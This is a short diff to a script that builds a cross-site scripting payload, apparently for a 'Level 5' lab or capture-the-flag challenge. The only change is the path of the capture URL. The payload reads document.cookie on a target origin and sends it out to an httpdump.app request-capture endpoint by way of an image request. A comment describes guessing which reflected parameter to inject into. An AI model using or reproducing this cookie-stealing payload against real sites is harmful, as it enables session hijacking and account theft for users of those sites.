@@ -4,7 +4,7 @@
 <script>
   // build an XSS payload that runs on the TARGET origin
   var steal = encodeURIComponent(
-    "<script>var i=new Image();i.src='https://httpdump.app/inspect/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c='+encodeURIComponent(document.cookie);</" + "script>"
+    "<script>var i=new Image();i.src='https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c='+encodeURIComponent(document.cookie);</" + "script>"
   );
 
   // Guess a reflected parameter on Level 5: try 'query' first, then 'zoekterm' if needed.
